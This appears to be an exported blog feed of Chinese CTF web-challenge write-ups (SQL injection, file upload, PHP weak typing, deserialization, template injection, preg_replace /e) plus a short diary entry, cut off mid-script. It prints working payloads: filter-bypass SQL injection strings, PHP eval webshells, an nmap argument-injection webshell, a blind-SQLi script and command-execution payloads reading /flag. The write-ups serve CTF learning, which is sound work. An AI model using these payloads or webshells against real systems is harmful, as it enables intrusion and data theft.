<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">过滤了<span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">from</span> <span class="keyword">where</span>好多，万能密码不好用了</span><br><span class="line"></span><br><span class="line">测试后可以闭合password</span><br><span class="line"></span><br><span class="line">看显示位</span><br><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; uunionnion sselectelect 1,2,3# </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获得表名，看绕过</span></span><br><span class="line"><span class="string">admin&#x27;</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema<span class="operator">=</span><span class="string">&#x27;geek&#x27;</span>#</span><br><span class="line"></span><br><span class="line">获得列名</span><br><span class="line">admin<span class="string">&#x27; ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆破</span></span><br><span class="line"><span class="string">admin&#x27;</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,group_concat(id,username,passwoorrd) frfromom b4bsql#</span><br><span class="line"></span><br><span class="line">获得flag</span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>文件上传姿势：</p>
<h2 id="phtml-修改content-type"><a href="#phtml-修改content-type" class="headerlink" title="phtml+修改content-type"></a>phtml+修改content-type</h2><p>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</p>
<p>检查文件头，加</p>
<pre><code>GIF89a
</code></pre>
<p>这个题蚁剑都没有用到，直接传个shell.phtml，然后post个cat /flag就行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.phtml&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>这里引入一个新的知识点:php弱类型绕过</p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只需要让key=123即可</p>
<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>F12，代码审计，改cookie，php弱类型，科学计数法传参</p>
<pre><code>payload: password=404a&amp;money=1e10
</code></pre>
<h1 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<p>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
<p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，<strong>该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为</strong>0。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>md5绕过：</strong></p>
<p>md5(‘240610708’) == md5(‘QNKCDZO’)</p>
<p>240610708 md5值为 0E462097431906509019562988736854</p>
<p>QNKCDZO md5值为 0E830400451993494058024219903391</p>
<p>array_search函数 类似于==</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
        <tag>文件上传</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>20210907</title>
    <url>/posts/6330ace9/</url>
    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
</code></pre>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>rce</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>20210926</title>
    <url>/posts/2601fefd/</url>
    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
<p>这个题呢，最终就是直接跑脚本</p>
<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
<p>sql的三目运算</p>
<pre><code>if( 表达式1，表达式2，表达式3)
</code></pre>
<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
<p>或者异或注入</p>
<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
</code></pre>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
<blockquote>
<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
</blockquote>
<p>进行尝试，</p>
<p>首先id=1union：</p>
<p>SQL Injection Checked.</p>
<p>再试试id=union1union：</p>
<p>bool(false)</p>
<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>

<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
        <tag>测试工具</tag>
      </tags>
  </entry>
  <entry>
    <title>20210927</title>
    <url>/posts/5106ce6b/</url>
    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
<p>php模板注入</p>
</blockquote>
<p>php存在模板注入漏洞，不仅python有，php也有</p>
<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
<p>反序列化绕过</p>
</blockquote>
<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
<p>直接cat flag也没有，只能find命令了</p>
<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>写出exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到pyload: </p>
<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
</code></pre>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>反序列化</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>20210928</title>
    <url>/posts/c1b9d3fa/</url>
    <content><![CDATA[<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
<p>代码审计 文件包含</p>
</blockquote>
<p>先利用data数据流，或者php://input绕过第一个，再利用php://filter读取next.php源码</p>
<p>这个有个坑，老忘，include php文件时，要用</p>
<pre><code>file=php://filter/read=convert.base64-encode/resource=next.php
</code></pre>
<p>尽心base64编码，否则传不过来。</p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们先看一下preg_replace用法</p>
<pre><code>preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] ) : mixed
</code></pre>
<p>搜索subject中匹配pattern的部分，以replacement进行替换。 </p>
<p>这里又看了看php语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> 循环用于遍历数组。</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每进行一次循环，当前数组元素的值就会被赋值给 <span class="variable">$value</span> 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每一次循环，当前数组元素的键与值就都会被赋值给 <span class="variable">$key</span> 和 <span class="variable">$value</span> 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  为 &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;，对应的 value 为 &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">key  为 <span class="number">1</span>，对应的 value 为 Google</span><br><span class="line">key  为 <span class="number">2</span>，对应的 value 为 Runoob</span><br><span class="line">key  为 <span class="number">3</span>，对应的 value 为 Taobao</span><br></pre></td></tr></table></figure>

<p>就差不多了，直接构造payload</p>
<pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
</code></pre>
<p>这里还利用了preg_replace /e 模式下的代码执行问题，\S*会匹配到getFlag这个函数</p>
<pre><code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$&#123;getFlag()&#125;);
</code></pre>
<p>preg_replace 函数在匹配到符号正则的字符串时，会将第二个参数当做代码来执行，即 ‘strtolower(“\1”)’ </p>
<p>这里的\1就相当于是第一个匹配项，由于\S<em>由</em>（）<em>包裹这里有个<strong>反向引用</strong>，\S</em>匹配的第一个表达式就是${getFlag()}，对其进行代码执行，进而利用这个函数的eval</p>
<p>还可以直接利用这个漏洞命令执行而不用eval</p>
<pre><code>?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;
</code></pre>
<p>拼接的</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>代码审计</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>20211015</title>
    <url>/posts/2348a06e/</url>
    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
<p>模板注入</p>
</blockquote>
<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
<p>而RequestHandler.settings又指向self.application.settings</p>
<p>所有handler.settings就指向RequestHandler.application.settings</p>
<p>可以获得一些设置</p>
<p>然后成功获得cookie_secret，md5获得hash值即可</p>
<p>在msg页面可以实现模板注入</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20211017</title>
    <url>/posts/cd46c142/</url>
    <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p>
<p>先上传user.ini</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure>
<p>然后上传图片马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>访问路径下的index.php，让它自动加载马</p>
<p>蚁剑或者直接cat flag</p>
<p>一会儿在本地测试一下</p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5的一些基操</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>20211018</title>
    <url>/posts/5df9dcd3/</url>
    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20211031</title>
    <url>/posts/161306f5/</url>
    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
<p>刚开始玩了会古墓丽影，不想玩了</p>
<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
<p>现在博客Github上和服务器上的都能用</p>
<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>2021Roke</title>
    <url>/posts/46047524/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>2021秋季赛部分wp</title>
    <url>/posts/31200392/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>震惊！平平无奇的web手，竟然把crypto ak了，顺带做了2个re和几个misc。。。</p>
<p>校赛感觉难度一般，就是给入门的做了，暑假学的好多都用上了，感觉不错。不过持续时间太长了，直接7天，而且国庆那几天贼忙，部门、工作室、新生······时间不是很合理，最后几天直接摆烂了，一个题也没做。</p>
<span id="more"></span>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote>
<p>无列名注入，和寒假赛的类似</p>
</blockquote>
<p>库名还是cumtctf</p>
<p>爆表名得到flag_table_1</p>
<p>无列名注入得到flag，需要变成小写</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.69.241.44:25500/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,_!@#$%^&amp;*()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(1,1000):</span></span><br><span 